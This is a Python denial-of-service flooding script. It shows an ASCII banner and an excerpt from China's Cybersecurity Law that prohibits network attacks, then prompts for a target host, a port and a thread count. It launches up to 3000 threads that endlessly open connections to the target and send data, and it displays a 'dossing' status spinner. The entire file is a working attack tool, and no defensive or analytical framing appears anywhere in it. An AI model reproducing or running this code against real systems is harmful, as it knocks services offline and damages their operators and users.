import os
import re
import sys
import time
import socket
import messages as msgs
from threading import Thread


s = r"""**********************************************************************************************************************************************
             ('-. .-.               .-')    .-') _     (`\ .-') /`             _  .-')  .-. .-')     ('-.  _  .-')   
            ( OO )  /              ( OO ). (  OO) )     `.( OO ),'            ( \( -O ) \  ( OO )  _(  OO)( \( -O )  
  ,----.    ,--. ,--. .-'),-----. (_)---\_)/     '._ ,--./  .--.   .-'),-----. ,------. ,--. ,--. (,------.,------.  
 '  .-./-') |  | |  |( OO'  .-.  '/    _ | |'--...__)|      |  |  ( OO'  .-.  '|   /`. '|  .'   /  |  .---'|   /`. ' 
 |  |_( O- )|   .|  |/   |  | |  |\  :` `. '--.  .--'|  |   |  |, /   |  | |  ||  /  | ||      /,  |  |    |  /  | | 
 |  | .--, \|       |\_) |  |\|  | '..`''.)   |  |   |  |.'.|  |_)\_) |  |\|  ||  |_.' ||     ' _)(|  '--. |  |_.' | 
(|  | '. (_/|  .-.  |  \ |  | |  |.-._)   \   |  |   |         |    \ |  | |  ||  .  '.'|  .   \   |  .--' |  .  '.' 
 |  '--'  | |  | |  |   `'  '-'  '\       /   |  |   |   ,'.   |     `'  '-'  '|  |\  \ |  |\   \  |  `---.|  |\  \  
  `------'  `--' `--'     `-----'  `-----'    `--'   '--'   '--'       `-----' `--' '--'`--' '--'  `------'`--' '--' 
**********************************************************************************************************************************************

						 《中华人民共和国网络安全法》部分摘要:
|============================================================================================================================================|
* 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。

* 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：
		（一）设置恶意程序的；
		（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；
		（三）擅自终止为其产品、服务提供安全维护的。
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 |============================================>》 你在做什么？
"""	
os.system("clear")
print(s)
ip = input("[   GET   ] <== 目标主机名/IP地址: ")
port=int(input("[   GET   ] <== 目标端口: "))
thread_number = int(input("[   GET   ] <== 线程数( < 3000): "))
msg = msgs.msgs[input("[   GET   ] <== 发送数据: ")]

if thread_number > 3000:
	thread_number = 3000

def main(ip,port,msg):
	while msg:
		s = socket.socket()
		s.connect((ip,port))
		s.sendall(msg.encode())
		s.close()
	while True:
		s = socket.socket()
		s.connect((ip,port))
		s.close()

now = [0,]

def river(now,_all):
	c = "="
	sys.stdout.write(f"\ralready put threads: %d(%d%%) [{c*int(now[0]/_all*100)}]"%(now[0],int(now[0]/_all*100)))
	if now[0] == _all:
		sys.stdout.write("\n")
		sys.exit()
# Thread(target=river, args=(now,thread_number)).start()

for i in range(thread_number):
	Thread(target=main, args=(ip,port,msg)).start()
# 	now[0] += 1

index = 0
while True:
	c = ["—","\\","|","/"]
	sys.stdout.write("\r[ status ] ==> dossing..."+c[index])
	index += 1
	if index >= 4:
		index = 0
	time.sleep(0.07)
